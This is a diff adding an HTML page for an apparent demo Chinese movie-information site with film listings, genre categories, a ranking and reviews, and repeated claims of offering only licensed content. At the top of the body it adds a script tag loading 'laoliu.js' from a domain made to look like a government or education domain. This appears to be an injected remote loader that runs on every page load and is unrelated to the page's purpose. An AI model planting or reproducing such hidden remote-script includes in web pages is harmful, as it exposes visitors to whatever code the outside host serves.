@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>957电影网（演示） - 正版定档、场景分类、期待榜与影评</title>
+<meta name="description" content="957电影网演示站(9527dianyingwang-h5.github.io)提供正版电影定档、观影场景与类型分类、期待热力榜与影评；移动端自适应，不提供在线播放、MP4/磁力/网盘下载与色情内容。">
+<meta name="keywords" content="957电影网,正版电影定档,观影场景分类,电影类型分类,电影期待榜,电影影评,影视资讯,正版渠道">
+<meta name="author" content="957电影网演示">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://9527dianyingwang-h5.github.io/">
+<style>
+:root{
+  --navy:#101a2e;--navy2:#16233c;--panel:#ffffff;--paper:#f5f8fc;--line:#e3e9f2;--ink:#1d2738;--muted:#6b7790;
+  --orange:#ff7a18;--orange2:#ffb15c;--mint:#2bb89a;--mint2:#7fd9c6;--rose:#ef6f86;--bg:#eef3fa;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:16px}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;line-height:1.65;color:var(--ink);background:var(--bg)}
+a{color:inherit;text-decoration:none}
+.disclaimer{background:#0b1220;color:#cfe0ff;font-size:.76rem;text-align:center;padding:.42rem 1rem;border-bottom:1px solid #243352}
+.header{position:sticky;top:0;z-index:1000;background:rgba(255,255,255,.96);border-bottom:1px solid var(--line)}
+.nav{max-width:1200px;margin:0 auto;height:58px;padding:0 1rem;display:flex;align-items:center;justify-content:space-between}
+.brand{font-weight:800;font-size:1.18rem;letter-spacing:.5px}
+.brand b{color:var(--orange)} .brand i{color:var(--mint);font-style:normal}
+.menu{display:flex;gap:.3rem;list-style:none}
+.menu a{padding:.42rem .85rem;border-radius:999px;font-size:.9rem;color:var(--muted)}
+.menu a:hover{background:linear-gradient(90deg,rgba(255,122,24,.16),rgba(43,184,154,.14));color:var(--ink)}
+.burger{display:none;font-size:1.5rem;cursor:pointer;color:var(--ink)}
+@media(max-width:768px){.menu{display:none}.burger{display:block}}
+
+/* 栏目1 Hero */
+.hero{background:radial-gradient(820px 360px at 92% -12%,rgba(255,122,24,.20) 0,transparent 55%),radial-gradient(760px 340px at 2% 118%,rgba(43,184,154,.18) 0,transparent 55%),linear-gradient(160deg,#fff,#eaf1fb);padding:52px 1rem}
+.herobox{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1fr 1.25fr;gap:2rem;align-items:center}
+.hero h1{font-size:clamp(1.9rem,4.4vw,3rem);line-height:1.15;margin-bottom:.8rem}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--orange),var(--mint));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero p{color:var(--muted);max-width:540px;margin-bottom:1.4rem}
+.cta{display:inline-block;background:linear-gradient(90deg,var(--orange),var(--mint));color:#fff;font-weight:700;padding:.78rem 1.7rem;border-radius:999px}
+.cta.ghost{background:#fff;color:var(--ink);border:1px solid var(--line);margin-left:.5rem}
+.deck{display:grid;grid-template-columns:repeat(3,1fr);gap:.7rem}
+.card9{border-radius:14px;overflow:hidden;background:var(--panel);border:1px solid var(--line);box-shadow:0 8px 22px rgba(16,26,46,.08);transition:.25s}
+.card9:hover{transform:translateY(-4px)}
+.card9 .cv{height:76px;display:flex;align-items:center;justify-content:center;font-size:1.8rem;color:#fff}
+.card9:nth-child(1) .cv{background:linear-gradient(135deg,var(--orange),#c85a06)}
+.card9:nth-child(2) .cv{background:linear-gradient(135deg,var(--mint),#1c7e69)}
+.card9:nth-child(3) .cv{background:linear-gradient(135deg,var(--navy2),#0c1830)}
+.card9:nth-child(4) .cv{background:linear-gradient(135deg,var(--rose),#b23c54)}
+.card9:nth-child(5) .cv{background:linear-gradient(135deg,var(--orange2),#e07e16)}
+.card9:nth-child(6) .cv{background:linear-gradient(135deg,var(--mint2),#239e84)}
+.card9:nth-child(7) .cv{background:linear-gradient(135deg,var(--navy),#22365c)}
+.card9:nth-child(8) .cv{background:linear-gradient(135deg,var(--orange),#d2690a)}
+.card9:nth-child(9) .cv{background:linear-gradient(135deg,var(--mint),#157a66)}
+.card9 .cb{padding:.6rem .8rem}
+.card9 .day{font-size:.66rem;color:#fff;background:linear-gradient(90deg,var(--orange),var(--mint));display:inline-block;padding:.1rem .5rem;border-radius:20px;margin-bottom:.25rem}
+.card9 h3{font-size:.86rem} .card9 small{color:var(--muted);font-size:.7rem}
+@media(max-width:900px){.herobox{grid-template-columns:1fr}.deck{grid-template-columns:repeat(3,1fr)}}
+@media(max-width:540px){.deck{grid-template-columns:repeat(2,1fr)}}
+
+/* 栏目2 场景+类型 */
+.section{padding:54px 1rem}
+.wrap{max-width:1200px;margin:0 auto}
+.sec-t{font-size:1.7rem;font-weight:800} .sec-s{color:var(--muted);margin:.35rem 0 1.5rem}
+.scenes{display:grid;grid-template-columns:repeat(5,1fr);gap:.8rem;margin-bottom:1.6rem}
+.sc{border-radius:16px;padding:1rem;background:var(--panel);border:1px solid var(--line);border-top:4px solid var(--orange)}
+.sc:nth-child(2){border-top-color:var(--mint)} .sc:nth-child(3){border-top-color:var(--navy2)} .sc:nth-child(4){border-top-color:var(--rose)} .sc:nth-child(5){border-top-color:var(--orange2)}
+.sc h3{font-size:.95rem;margin-bottom:.25rem} .sc small{color:var(--muted);font-size:.74rem;display:block;margin-bottom:.5rem}
+.chips{display:flex;flex-wrap:wrap;gap:.3rem}
+.chip{font-size:.7rem;padding:.18rem .55rem;border-radius:20px;background:#eef3fb;border:1px solid var(--line);color:var(--muted)}
+.genres{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem}
+.gc{border-radius:16px;overflow:hidden;background:var(--panel);border:1px solid var(--line);transition:.25s}
+.gc:hover{transform:translateY(-5px);box-shadow:0 14px 32px rgba(16,26,46,.1)}
+.gc .gh{height:86px;display:flex;align-items:center;justify-content:space-between;padding:0 1rem;color:#fff;font-weight:800}
+.gc:nth-child(1) .gh{background:linear-gradient(135deg,var(--orange),#c85a06)}
+.gc:nth-child(2) .gh{background:linear-gradient(135deg,var(--mint),#1c7e69)}
+.gc:nth-child(3) .gh{background:linear-gradient(135deg,var(--navy2),#0c1830)}
+.gc:nth-child(4) .gh{background:linear-gradient(135deg,var(--rose),#b23c54)}
+.gc .gb{padding:1rem}
+.gc h3{font-size:.96rem;margin-bottom:.35rem} .gc p{font-size:.8rem;color:var(--muted);margin-bottom:.7rem}
+@media(max-width:980px){.scenes{grid-template-columns:repeat(3,1fr)}}
+@media(max-width:880px){.genres{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:620px){.scenes{grid-template-columns:repeat(2,1fr)}.genres{grid-template-columns:1fr}}
+
+/* 栏目3 热力进度榜 */
+.heatsec{background:var(--panel);border:1px solid var(--line);border-radius:18px;overflow:hidden}
+.rk{display:grid;grid-template-columns:54px 1fr 160px;gap:.8rem;align-items:center;padding:.9rem 1rem;border-bottom:1px solid var(--line)}
+.rk:last-child{border-bottom:0}
+.no{width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;color:#fff;background:linear-gradient(135deg,var(--orange),var(--mint))}
+.no.s{background:#cdd6e6;color:#1d2738}
+.info h4{font-size:.95rem} .info small{color:var(--muted);font-size:.74rem}
+.tag{display:inline-block;font-size:.68rem;padding:.12rem .5rem;border-radius:10px;margin-right:.3rem;background:#fdeede;border:1px solid var(--line);color:#c85a06}
+.tag.m{background:#e2f5f0;color:#1c7e69} .tag.n{background:#e7ecf5;color:var(--navy2)} .tag.r{background:#fde7ec;color:#b23c54}
+.bar{height:8px;border-radius:6px;background:#eef2f8;overflow:hidden;margin-top:.35rem}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--orange),var(--mint))}
+.score{text-align:right;font-weight:800;color:var(--orange)}
+.score small{display:block;font-weight:400;color:var(--muted)}
+
+/* 栏目4 影评+渠道 */
+.rev{display:grid;grid-template-columns:1.7fr .9fr;gap:1.4rem}
+.cards{display:grid;grid-template-columns:repeat(2,1fr);gap:1rem}
+.rcard{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:1rem}
+.rcard .top{display:flex;justify-content:space-between;align-items:center;margin-bottom:.4rem}
+.rcard h4{font-size:.95rem} .stars{color:var(--orange);font-size:.78rem}
+.rcard p{font-size:.84rem;color:var(--muted)}
+.side .wd{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:1.1rem;margin-bottom:1.1rem}
+.side h3{font-size:1rem;margin-bottom:.7rem;color:#c85a06}
+.ch{display:flex;align-items:center;gap:.6rem;padding:.5rem 0;border-bottom:1px dashed var(--line);font-size:.85rem}
+.ch:last-child{border-bottom:0}
+.form{display:grid;gap:.7rem;max-width:420px}
+.form input,.form textarea{padding:.75rem 1rem;border:1px solid var(--line);border-radius:10px;font:inherit;background:#fff}
+.form button{background:linear-gradient(90deg,var(--orange),var(--mint));color:#fff;border:0;border-radius:10px;padding:.8rem;font-weight:700;cursor:pointer}
+.note{font-size:.78rem;color:var(--muted);margin-top:.6rem}
+.footer{background:#0b1220;color:#bcd0ee;text-align:center;padding:24px 1rem;font-size:.82rem}
+.footer a{color:#ffd1ab;margin:0 .4rem}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="disclaimer">本站为「957电影网」独立演示页，与任何 957/9527 影视在线播放、磁力、网盘、BT下载、跳转站无关联、非官方；仅提供正版影视资讯与影评，不提供在线播放、枪版/未删减、MP4、磁力、网盘及色情内容。数字影视站名若宣称“全集/未删减/独家高清”但不能提供授权主体与范围，应视为高风险。[5,9](@ref)</div>
+
+<header class="header">
+  <nav class="nav" aria-label="主导航">
+    <div class="brand">957<b>电影网</b><i>H5</i></div>
+    <ul class="menu">
+      <li><a href="#home">九档甄选</a></li>
+      <li><a href="#cats">场景/类型</a></li>
+      <li><a href="#rank">期待榜</a></li>
+      <li><a href="#reviews">影评/渠道</a></li>
+    </ul>
+    <div class="burger" aria-label="菜单">☰</div>
+  </nav>
+</header>
+
+<!-- 栏目1 九档五场景七心情 -->
+<section class="hero" id="home">
+  <div class="herobox">
+    <div>
+      <h1>957·<em>九档正版甄选</em></h1>
+      <p>按九部定档新片、五类观影场景、七种心情整理公映/持牌片单与影评。全站不提供“抢先完整版”播放，不提供MP4、磁力、网盘解析；做网络点播须持《信息网络传播视听节目许可证》，片源须具公映/发行许可并取得著作权人网络授权。</p>
+      <a href="#cats" class="cta">按场景找片</a>
+      <a href="#rank" class="cta ghost">看期待榜</a>
+    </div>
+    <div class="deck">
+      <article class="card9"><div class="cv">🎬</div><div class="cb"><span class="day">档1</span><h3><a href="#">《潮汐码头》</a></h3><small>剧情/海滨·公映定档</small></div></article>
+      <article class="card9"><div class="cv">🧸</div><div class="cb"><span class="day">档2</span><h3><a href="#">《云朵修理铺》</a></h3><small>动画/合家·正版发行</small></div></article>
+      <article class="card9"><div class="cv">🕵️</div><div class="cb"><span class="day">档3</span><h3><a href="#">《九号审讯室》</a></h3><small>悬疑/犯罪·持牌点播</small></div></article>
+      <article class="card9"><div class="cv">💛</div><div class="cb"><span class="day">档4</span><h3><a href="#">《糖水天气预报》</a></h3><small>爱情/治愈·院线+会员</small></div></article>
+      <article class="card9"><div class="cv">🌌</div><div class="cb"><span class="day">档5</span><h3><a href="#">《近地回声》</a></h3><small>科幻/冒险·4K资讯</small></div></article>
+      <article class="card9"><div class="cv">🎭</div><div class="cb"><span class="day">档6</span><h3><a href="#">《旧剧场最后一排》</a></h3><small>文艺/戏曲·展映修复</small></div></article>
+      <article class="card9"><div class="cv">🍿</div><div class="cb"><span class="day">档7</span><h3><a href="#">《周末飞盘局》</a></h3><small>喜剧/运动·正版字幕</small></div></article>
+      <article class="card9"><div class="cv">🐋</div><div class="cb"><span class="day">档8</span><h3><a href="#">《冷洋守灯人》</a></h3><small>纪录/自然·公映资讯</small></div></article>
+      <article class="card9"><div class="cv">🎞️</div><div class="cb"><span class="day">档9</span><h3><a href="#">《胶片慢车》</a></h3><small>怀旧/修复·展映排期</small></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2 场景+类型 -->
+<section class="section" id="cats">
+  <div class="wrap">
+    <h2 class="sec-t">五场景 + 四类型双维分类</h2>
+    <p class="sec-s">先按约会/合家/独处/通勤/深夜筛片，再叠加类型。卡片、标签内链全 #，仅整理正版公映/持牌信息。</p>
+    <div class="scenes">
+      <div class="sc"><h3>🎞️ 约会周末</h3><small>爱情、轻喜剧、美食</small><div class="chips"><a href="#" class="chip">纯爱 #</a><a href="#" class="chip">轻喜剧 #</a><a href="#" class="chip">美食 #</a></div></div>
+      <div class="sc"><h3>🧑‍🧑‍🧒 合家亲子</h3><small>动画、全龄、温情</small><div class="chips"><a href="#" class="chip">动画 #</a><a href="#" class="chip">全龄 #</a><a href="#" class="chip">温情 #</a></div></div>
+      <div class="sc"><h3>🌙 独处深夜</h3><small>悬疑、文艺、长片</small><div class="chips"><a href="#" class="chip">悬疑 #</a><a href="#" class="chip">文艺 #</a><a href="#" class="chip">独立 #</a></div></div>
+      <div class="sc"><h3>🚇 通勤午间</h3><small>短片、轻动画、微纪</small><div class="chips"><a href="#" class="chip">短片 #</a><a href="#" class="chip">轻动画 #</a><a href="#" class="chip">微纪 #</a></div></div>
+      <div class="sc"><h3>🎟️ 展映怀旧</h3><small>修复、戏曲、胶片</small><div class="chips"><a href="#" class="chip">4K修复 #</a><a href="#" class="chip">戏曲 #</a><a href="#" class="chip">胶片 #</a></div></div>
+    </div>
+    <div class="genres">
+      <article class="gc"><div class="gh"><span>剧情/海滨</span><span>🎬</span></div><div class="gb"><h3><a href="#">剧情海滨</a></h3><p>人物、城市、自然变迁，侧重公映版与展映资讯。</p><div class="chips"><a href="#" class="chip">人物 #</a><a href="#" class="chip">城市 #</a><a href="#" class="chip">自然 #</a></div></div></article>
+      <article class="gc"><div class="gh"><span>动画/合家</span><span>🧸</span></div><div class="gb"><h3><a href="#">动画合家</a></h3><p>剧场版、儿童向、奇幻冒险，关注正版4K与排期。</p><div class="chips"><a href="#" class="chip">剧场版 #</a><a href="#" class="chip">儿童 #</a><a href="#" class="chip">奇幻 #</a></div></div></article>
+      <article class="gc"><div class="gh"><span>悬疑/犯罪</span><span>🕵️</span></div><div class="gb"><h3><a href="#">悬疑犯罪</a></h3><p>本格推理、社会派、刑侦复盘，只评正版字幕与持牌点播。</p><div class="chips"><a href="#" class="chip">本格 #</a><a href="#" class="chip">社会派 #</a><a href="#" class="chip">刑侦 #</a></div></div></article>
+      <article class="gc"><div class="gh"><span>科幻/冒险</span><span>🌌</span></div><div class="gb"><h3><a href="#">科幻冒险</a></h3><p>近地太空、末世、成长冒险，适合大屏正版4K/杜比。</p><div class="chips"><a href="#" class="chip">近地 #</a><a href="#" class="chip">末世 #</a><a href="#" class="chip">成长 #</a></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3 热力期待榜 -->
+<section class="section" id="rank" style="background:#eaf1fb">
+  <div class="wrap">
+    <h2 class="sec-t">957期待热力榜</h2>
+    <p class="sec-s">演示期待值/口碑综合，按公映、点播、展映整理；不爬枪版、不标未删减、不提供资源下载。</p>
+    <div class="heatsec">
+      <div class="rk"><div class="no">1</div><div class="info"><h4><span class="tag">剧情</span><span class="tag m">海滨</span><a href="#">《潮汐码头》</a></h4><small>公映定档·群像叙事·正版字幕</small><div class="bar"><i style="width:95%"></i></div></div><div class="score">95<small>期待热力</small></div></div>
+      <div class="rk"><div class="no">2</div><div class="info"><h4><span class="tag m">动画</span><span class="tag">合家</span><a href="#">《云朵修理铺》</a></h4><small>正版发行·4K·院线+会员</small><div class="bar"><i style="width:92%"></i></div></div><div class="score">92<small>期待热力</small></div></div>
+      <div class="rk"><div class="no s">3</div><div class="info"><h4><span class="tag r">悬疑</span><span class="tag n">犯罪</span><a href="#">《九号审讯室》</a></h4><small>持牌点播·双线审讯·不追枪版</small><div class="bar"><i style="width:90%"></i></div></div><div class="score">90<small>期待热力</small></div></div>
+      <div class="rk"><div class="no s">4</div><div class="info"><h4><span class="tag">爱情</span><span class="tag m">治愈</span><a href="#">《糖水天气预报》</a></h4><small>公映字幕·周末约会场景</small><div class="bar"><i style="width:88%"></i></div></div><div class="score">88<small>期待热力</small></div></div>
+      <div class="rk"><div class="no s">5</div><div class="info"><h4><span class="tag n">科幻</span><span class="tag m">4K</span><a href="#">《近地回声》</a></h4><small>大屏声画·持牌点播资讯</small><div class="bar"><i style="width:86%"></i></div></div><div class="score">86<small>期待热力</small></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4 影评+渠道 -->
+<section class="section" id="reviews">
+  <div class="wrap">
+    <h2 class="sec-t">957影评 & 正版渠道</h2>
+    <p class="sec-s">按场景/定档写短评；渠道仅导航持牌平台，不解析、不提供下载。</p>
+    <div class="rev">
+      <div class="cards">
+        <div class="rcard"><div class="top"><h4><a href="#">《潮汐码头》剧情向</a></h4><span class="stars">★★★★★ 9.5</span></div><p>公映版对白完整、字幕准确；海滨慢片适合周末与展映，不找枪版/未删减，优先院线杜比与正规点播。</p></div>
+        <div class="rcard"><div class="top"><h4><a href="#">《云朵修理铺》合家向</a></h4><span class="stars">★★★★★ 9.2</span></div><p>正版4K对配音与色彩更友好；大屏看场景、移动端看缓存，不提供MP4与磁力。</p></div>
+        <div class="rcard"><div class="top"><h4><a href="#">《九号审讯室》悬疑向</a></h4><span class="stars">★★★★☆ 9.0</span></div><p>双线供词与声画层次；持牌平台比网盘稳定，重点评剪辑节奏与正版字幕准确度。</p></div>
+        <div class="rcard"><div class="top"><h4><a href="#">《旧剧场最后一排》文艺向</a></h4><span class="stars">★★★★☆ 8.7</span></div><p>戏曲文艺片看降噪与调色；按公映许可整理排期，不标“完整版抢先”。</p></div>
+      </div>
+      <aside class="side">
+        <div class="wd">
+          <h3>正版渠道导航</h3>
+          <div class="ch">🎬 院线定档 <span>公映许可/场次 #</span></div>
+          <div class="ch">📺 持牌点播 <span>视听许可证/会员 #</span></div>
+          <div class="ch">📣 片方官宣 <span>发行/预告/字幕授权 #</span></div>
+          <div class="ch">🎟️ 展映修复 <span>4K/资料馆 #</span></div>
+        </div>
+        <div class="wd">
+          <h3>定档/影评投稿</h3>
+          <form class="form" onsubmit="event.preventDefault();alert('演示提交成功（不对接后端）');">
+            <input type="text" name="name" placeholder="称呼" required>
+            <input type="email" name="email" placeholder="邮箱" required>
+            <textarea name="msg" placeholder="正版定档投稿/场景分类建议/影评合作" required></textarea>
+            <button type="submit">提交</button>
+          </form>
+          <p class="note">本演示不接盗版/枪版/未删减/磁力/网盘/色情；做影视网络点播须持《信息网络传播视听节目许可证》，电影/剧集须具公映/发行许可证，并按院线/电视/网站/OTT等渠道取得著作权人网络授权。</p>
+        </div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div>
+    <a href="#home">九档甄选</a><a href="#cats">场景/类型</a><a href="#rank">期待榜</a><a href="#reviews">影评/渠道</a>
+  </div>
+  <p style="margin-top:.6rem">© 2026 957电影网（演示）· 9527dianyingwang-h5.github.io · 独立演示、与任何 957/9527 影视播放/下载站无关联 · 仅作合法影视资讯</p>
+</footer>
+
+</body>
+</html>
